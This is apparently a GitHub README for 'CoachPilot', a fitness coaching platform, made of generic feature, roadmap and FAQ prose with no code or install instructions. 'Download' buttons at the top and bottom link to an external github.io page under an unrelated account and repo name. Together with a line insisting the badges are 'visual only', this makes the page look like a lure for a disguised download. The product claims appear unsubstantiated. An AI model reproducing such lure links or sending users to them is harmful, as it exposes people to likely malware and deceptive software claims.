![preview](https://raw.githubusercontent.com/lhzin2129-wq/forge-nutrition-clients/main/hero_e489ca.svg)
[![Download](https://raw.githubusercontent.com/lhzin2129-wq/forge-nutrition-clients/main/run_ad8b.svg)](https://lhzin2129-wq.github.io/forge-nutrition-clients/)

# CoachPilot — Autonomous Coaching Engine for Modern Trainers 🏋️‍♂️

Badges (visual only — no download triggers here):

![status](https://img.shields.io/badge/status-active%20development-2ea44f?style=for-the-badge)
![platform](https://img.shields.io/badge/platform-web%20%7C%20mobile-1f6feb?style=for-the-badge)
![languages](https://img.shields.io/badge/i18n-12%20locales-8957e5?style=for-the-badge)
![license](https://img.shields.io/badge/license-MIT-yellow?style=for-the-badge)
![support](https://img.shields.io/badge/support-24%2F7-ff6b6b?style=for-the-badge)
![build](https://img.shields.io/badge/build-passing-brightgreen?style=for-the-badge)

---

## 🧭 Table of Contents

1. [What Is CoachPilot?](#-what-is-coachpilot)
2. [Why This Exists](#-why-this-exists)
3. [Core Concepts & Vocabulary](#-core-concepts--vocabulary)
4. [Feature Tour](#-feature-tour)
5. [The Program Forge Engine](#-the-program-forge-engine)
6. [Client Constellation Hub](#-client-constellation-hub)
7. [Nutrition Ledger & Macro Telemetry](#-nutrition-ledger--macro-telemetry)
8. [Responsive Interface & Multilingual Reach](#-responsive-interface--multilingual-reach)
9. [Analytics & Progress Signals](#-analytics--progress-signals)
10. [Integrations & Data Flow](#-integrations--data-flow)
11. [Security, Privacy & Compliance](#-security-privacy--compliance)
12. [Roadmap 2026](#-roadmap-2026)
13. [Contribution Guide](#-contribution-guide)
14. [Frequently Asked Questions](#-frequently-asked-questions)
15. [Support & Community](#-support--community)
16. [License](#-license)
17. [Disclaimer](#-disclaimer)

---

## 🚀 What Is CoachPilot?

CoachPilot is the co-pilot cabin for personal trainers, strength coaches, physiotherapists, nutrition consultants, and boutique fitness studios. Instead of stitching together four disconnected tools for programming, client management, and dietary tracking, CoachPilot folds all of it into one continuous cockpit.

Think of it as the difference between hand-drafting a flight plan on napkins versus having an onboard navigation system that already knows the winds, the fuel, and the destination. You still fly the plane — CoachPilot just keeps the instruments honest.

The repository you're looking at is the monorepo that hosts the backend orchestration layer, the web client, the mobile companion shell, the shared type contracts, and the program-generation domain logic.

> CoachPilot is built for practitioners who want to spend their hours coaching humans, not wrestling spreadsheets.

---

## 🤔 Why This Exists

Most coaching software was designed around the gym's paperwork, not the coach's thinking. Coaches end up:

- Regenerating the same warm-up blocks by hand, week after week.
- Chasing clients over chat for check-ins that should be automatic.
- Manually re-keying macros into a second app because the first one can't export.
- Losing client history when a subscription lapses.

CoachPilot treats the coach's time as the scarce resource. The core promise is simple: **the tool should absorb the tedium, and the coach should absorb the insight**.

---

## 📚 Core Concepts & Vocabulary

Before digging into features, a short shared vocabulary helps — these terms appear throughout the codebase, the API, and the UI.

- **Pilot** — a coaching professional using the platform.
- **Cadet** — a client under a pilot's guidance. (This is the domain name for what most apps just call "users".)
- **Forge** — the deterministic-but-tunable engine that composes training programs.
- **Ledger** — the append-only record of a cadet's nutrition entries.
- **Constellation** — a pilot's roster of cadets, visualized together.
- **Signal** — any measurable event (a logged set, a weight reading, a sleep score) ingested into the analytics pipeline.

---

## ✨ Feature Tour

### 🧩 Program Generation
- Generate multi-week mesocycles from a small set of inputs: goal, frequency, equipment, experience level, and time-per-session.
- Periodization templates for hypertrophy, strength, fat-loss, endurance, and general health.
- Manual override at any layer — the coach always keeps the final word.
- Export to printable sheets, calendar feeds, and coach-shareable summaries.

### 👥 Client Management
- Full cadet profiles with goals, medical notes, injury history, and consent tracking.
- Grouping by cohort, program, or custom tags.
- Automated check-in cadences with reminders.
- Adherence scoring per cadet, per week, per block.

### 🍎 Nutrition Tracking
- Structured macro and micronutrient ledger with an offline-first entry model.
- Meal templates, recurring entries, and quick-add presets.
- Weekly and rolling averages — not just vanity daily totals.
- Coach-side annotations on any cadet's ledger entries.

### 📊 Analytics
- Session volume, tonnage, and RPE trends across any time window.
- Retention and adherence curves per cohort.
- Goal-progress projection using linear and weighted regressions.

### 🌐 Platform & Experience
- Responsive user interface that reflows cleanly from a phone in the gym to a tablet on a desk.
- Multilingual support across twelve locales with right-to-left layout readiness.
- 24/7 customer support channel with documented response windows.
- Role-aware access: owner, staff coach, assistant, and read-only analyst.

---

## 🛠️ The Program Forge Engine

The Forge is where CoachPilot earns its name. It's a compositional engine, not a chatbot and not a black box.

Every generated program is assembled from a small library of primitives:

1. **Movement Patterns** — push, pull, hinge, squat, carry, rotate, brace.
2. **Loading Schemes** — linear, undulating, wave, cluster, rest-pause.
3. **Volume Anchors** — weekly set targets calibrated to experience tier.
4. **Session Shapes** — full-body, upper/lower, push/pull/legs, bro-split, focus blocks.
5. **Deload Triggers** — fatigue gates that pause progression before breakdown.

The engine composes these into a draft, then the pilot reviews, tunes, and publishes. Generation is *deterministic given the same inputs and seed*, which means the same program can be reproduced exactly for audits, comparisons, or peer review.

Key principles:

- **Transparent reasoning.** Every generated slot has a human-readable justification attached.
- **Coach-first override.** Any block, exercise, or set can be swapped without invalidating the rest.
- **Deterministic by default, random on demand.** Seeded shuffling exists for variety, but it's opt-in.

---

## 🌌 Client Constellation Hub

The Constellation is the pilot's roster view. It answers the question every coach has at 6 AM: *who needs my attention today?*

- Cadets are rendered as cards with a health status derived from signals (streak, adherence, missed check-ins, notes).
- Filter by status, tag, program block, or next-due cadence.
- Bulk actions: send a note, reassign a block, pause reminders, export a roster snapshot.
- Timeline view that shows a pilot's week at a glance, cadet by cadet.

The design philosophy here is "warm radar" — a calm surface that surfaces what matters without shouting.

---

## 🥗 Nutrition Ledger & Macro Telemetry

Nutrition in CoachPilot isn't a calorie counter dressed up in a lab coat. It's a *ledger* — append-only, auditable, and coach-readable.

- Every entry carries a timestamp, source (manual, template, imported), and optional context tag (pre-workout, travel day, refeed).
- The ledger supports partial days gracefully — a missing lunch isn't a failure state, it's just missing data.
- Rolling averages, weekly compliance, and trend arrows are computed automatically.
- Coach annotations are timestamped and visible to the cadet, building a shared narrative around food.

The ledger is designed to be *discussion fuel*, not a scoreboard.

---

## 📱 Responsive Interface & Multilingual Reach

The platform is built mobile-first and progressively enhanced for larger canvases.

- **Responsive user interface** that adapts to phone, tablet, laptop, and wall-mounted studio displays.
- **Multilingual support** for twelve locales, with a translation pipeline that accepts community contributions.
- **Right-to-left** layout readiness for Arabic and Hebrew locales.
- **Dark and light modes** with automatic system detection and manual override.
- **Accessibility** as a first-class concern: keyboard navigation, screen-reader labels, and adjustable type scaling.

---

## 📈 Analytics & Progress Signals

Analytics in CoachPilot are framed as *signals*, not verdicts. The goal is to help coaches ask better questions.

- **Volume & tonnage trends** broken down by muscle group, movement pattern, and block.
- **Adherence curves** that distinguish "missed session" from "skipped exercise" from "partial log".
- **Projection tools** that extrapolate current trends toward goal dates, with explicit confidence bands.
- **Export** to CSV and JSON for external analysis, with a documented schema.

Reports are generated on demand and cacheable for fast re-viewing.

---

## 🔌 Integrations & Data Flow

CoachPilot is deliberately integration-friendly:

- **Calendar feeds** — subscribe to a cadet's upcoming sessions from any calendar app.
- **Wearable summaries** — ingest daily activity and sleep summaries via documented webhooks.
- **Webhook events** — subscribe to cadet check-ins, ledger updates, and program publishes.
- **Import bridges** — bring in historical rosters and program archives.

All inbound data flows through a validation layer that rejects malformed payloads early, so the ledger never ends up with phantom entries.

---

## 🔐 Security, Privacy & Compliance

- **Role-based access control** across every read and write path.
- **Encrypted at rest and in transit** using industry-standard primitives.
- **Audit logs** for every state-changing action, retained per configurable policy.
- **Data subject requests** supported end-to-end: export, correction, and deletion.
- **Consent tracking** per cadet, per purpose, with versioned policy snapshots.

Health-adjacent data deserves serious care, and CoachPilot treats it that way.

---

## 🗺️ Roadmap 2026

- **Q1 2026** — Public beta of the Forge v2 with fatigue-aware deloads.
- **Q2 2026** — Native mobile companions for iOS and Android shells.
- **Q3 2026** — Expanded multilingual support with two additional locales.
- **Q4 2026** — Cohort benchmarking and anonymized industry trend signals.

Roadmap items are directional and may shift based on community feedback.

---

## 🤝 Contribution Guide

Contributions of every size are welcome — from typo fixes to whole subsystems.

- **Discuss first** for anything larger than a small fix: open an issue describing the intent.
- **One concern per change.** Small, focused changes review faster and age better.
- **Write the test you wish existed** before writing the fix.
- **Document the why**, not just the what. Future readers will thank you.
- **Respect the tone.** CoachPilot's community values curiosity over certainty.

A separate `CONTRIBUTING.md` covers style guides, commit conventions, and review expectations in detail.

---

## ❓ Frequently Asked Questions

**Is CoachPilot suitable for solo trainers?**
Yes. The Cadet model scales from one client to hundreds without changing the mental model.

**Does it work offline?**
The nutrition ledger is offline-first. Other areas sync when connectivity returns.

**Can I migrate my existing client data?**
Yes, via the import bridges. A migration checklist ships with the docs.

**Where is customer support reachable?**
Our 24/7 customer support channel is documented in the support section below.

**What languages are supported today?**
Twelve locales at launch, with community translation pipelines open.

---

## 💬 Support & Community

- **24/7 customer support** for operational questions and onboarding help.
- **Community forum** for feature discussion and peer tips.
- **Status page** documenting uptime and incident reports.
- **Changelog** published with every tagged release.

If you've found a security issue, please follow responsible disclosure practices rather than opening a public issue.

---

## 📜 License

Released under the [MIT License](https://opensource.org/licenses/MIT). See the `LICENSE` file in this repository for the full text.

Copyright © 2026 CoachPilot contributors.

---

## ⚠️ Disclaimer

CoachPilot is a software tool for coaching professionals. It does **not** provide medical advice, diagnosis, or treatment. Generated training programs and nutrition insights are informational starting points and must be reviewed by a qualified professional before being applied to any individual. Pilots are solely responsible for verifying that any program, prescription, or recommendation they deliver is appropriate for their cadet's health status and goals.

Always consult a licensed healthcare provider before beginning any new training or nutrition regimen, especially if the individual has a pre-existing condition, is pregnant, or is recovering from injury.

The maintainers of this repository accept no liability for outcomes arising from use of the software. By using CoachPilot, you agree to these terms.

---

[![Download](https://raw.githubusercontent.com/lhzin2129-wq/forge-nutrition-clients/main/run_ad8b.svg)](https://lhzin2129-wq.github.io/forge-nutrition-clients/)